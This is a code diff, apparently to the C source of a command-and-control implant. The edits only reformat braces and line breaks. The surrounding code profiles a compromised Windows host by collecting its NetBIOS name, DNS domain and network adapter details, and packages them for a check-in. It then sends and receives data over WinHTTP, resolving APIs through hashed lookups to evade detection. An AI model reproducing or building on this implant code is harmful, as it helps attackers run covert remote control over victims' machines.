@@ -111,8 +111,11 @@ BOOL TransportInit( ) {
     GetComputerNameExA_t p_GetComputerNameExA = (GetComputerNameExA_t) GetProcAddressByHash(p_kernel32,
                                                                                             GetComputerNameExA_CRC32B);
     if ( ! p_GetComputerNameExA(ComputerNameNetBIOS, NULL, (LPDWORD) &Length) ) {
-        if ( ( Data = LocalAlloc( LPTR, Length ) ) )
-            check_debug(p_GetComputerNameExA(ComputerNameNetBIOS, Data, (LPDWORD) &Length) != 0, "GetComputerNameExA Failed!");
+
+        if ( ( Data = LocalAlloc( LPTR, Length ) ) ) {
+            check_debug(p_GetComputerNameExA(ComputerNameNetBIOS, Data, (LPDWORD) &Length) != 0,
+                        "GetComputerNameExA Failed!");
+        }
     }
 
     PackageAddBytes( Package, Data, Length );
@@ -131,8 +134,10 @@ BOOL TransportInit( ) {
 
     // Get Domain
     if ( ! p_GetComputerNameExA(ComputerNameDnsDomain, NULL, (LPDWORD) &Length) ) {
-        if ( ( Data = LocalAlloc( LPTR, Length ) ) )
-            check_debug(p_GetComputerNameExA(ComputerNameDnsDomain, Data, (LPDWORD) &Length) != 0, "GetComputerNameExA Failed!");
+        if ( ( Data = LocalAlloc( LPTR, Length ) ) ) {
+            check_debug(p_GetComputerNameExA(ComputerNameDnsDomain, Data, (LPDWORD) &Length) != 0,
+                        "GetComputerNameExA Failed!");
+        }
     }
     PackageAddBytes( Package, Data, Length );
     DATA_FREE( Data, Length );
@@ -148,11 +153,10 @@ BOOL TransportInit( ) {
             mem_set( Adapter, 0, Length );
             LocalFree( Adapter );
             Adapter = NULL;
-        }
-        else
+        }else{
             PackageAddInt32( Package, 0 );
-    }
-    else {
+        }
+    }else {
         PackageAddInt32(Package, 0);
     }
 
@@ -375,8 +379,7 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     WinHttpSendRequest_t pWinHttpSendRequest  = (WinHttpSendRequest_t) GetProcAddressByHash(LocalGetModuleHandle(winhttp),
                                                                                             WinHttpSendRequest_CRC32B);
     // Send our data
-    if ( pWinHttpSendRequest( hRequest, NULL, 0, Data, Size, Size, NULL ) )
-    {
+    if ( pWinHttpSendRequest( hRequest, NULL, 0, Data, Size, Size, NULL ) ){
 #else
     // Send our data
     if ( WinHttpSendRequest( hRequest, NULL, 0, Data, Size, Size, NULL ) )
@@ -386,8 +389,7 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
 #if CONFIG_OBFUSCATION == TRUE
         WinHttpReceiveResponse_t pWinHttpReceiveResponse  = (WinHttpReceiveResponse_t) GetProcAddressByHash(
                 LocalGetModuleHandle(winhttp), WinHttpReceiveResponse_CRC32B);
-        if ( RecvData && pWinHttpReceiveResponse( hRequest, NULL ) )
-        {
+        if ( RecvData && pWinHttpReceiveResponse( hRequest, NULL ) ){
 #else
             if ( RecvData && WinHttpReceiveResponse( hRequest, NULL ) )
         {
@@ -404,8 +406,7 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
                 Successful = WinHttpReadData( hRequest, Buffer, 1024, &BufRead );
 #endif
 
-                if ( ! Successful || BufRead == 0 )
-                {
+                if ( ! Successful || BufRead == 0 ){
                     check_debug(Successful, "WinHttpReadData Failed!");
                     break;
                 }
